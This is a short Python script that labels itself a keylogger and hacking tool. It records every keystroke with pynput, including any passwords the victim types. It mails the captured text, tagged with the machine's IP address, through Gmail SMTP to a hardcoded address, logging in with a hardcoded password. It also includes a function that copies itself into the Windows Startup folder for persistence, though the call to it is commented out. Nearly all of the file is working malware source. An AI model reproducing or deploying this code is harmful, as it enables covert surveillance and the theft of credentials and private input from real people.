#version keylogger.py 1.1.1 ////hacking tool\\\\\\\\\
print("keylogger version###############1.1.1##################")
from pynput.keyboard import Key, Listener
import smtplib, ssl
import time
import schedule
import socket
from email.message import EmailMessage
import os
import shutil


word = " "
def move_file_to_startapp():
    main_destination = ['Hp', 'hp', 'user', 'lenovo', 'dell']
    current_dir = os.getcwd()
    destination = " "
    for dir in main_destination:
      try:
        if str(dir) in current_dir:
          destination = "C:\\Users\\Hp\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.py"

      except:
        print("not found")
    
    shutil.copy(current_dir, destination)





def sendmail(user_message):
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    sender_email = "blackhatnatz@gmail.com"
    server.login(sender_email, "stipsgzhbjyonvle")
    msg = EmailMessage()
    msg['Subject'] = f'from {ip} '
    msg['From'] = sender_email
    msg['To'] = sender_email
    msg.set_content(user_message)
    server.send_message(msg)
def on_press(key):
#this is the function that records the pressed keys 
    global word
#this are the conditionals that helps to make anything you want using the 
  
    if (key == Key.space) or key == Key.enter:
        word += ' '
        
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift:
        word += ''
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    print("{0} pressed".format(key))
    
    for i in range(1,11):
        if len(word) / 100 == i:
            sendmail(word)

#move_file_to_startapp()
with Listener(on_press=on_press) as listener:
    listener.join()


 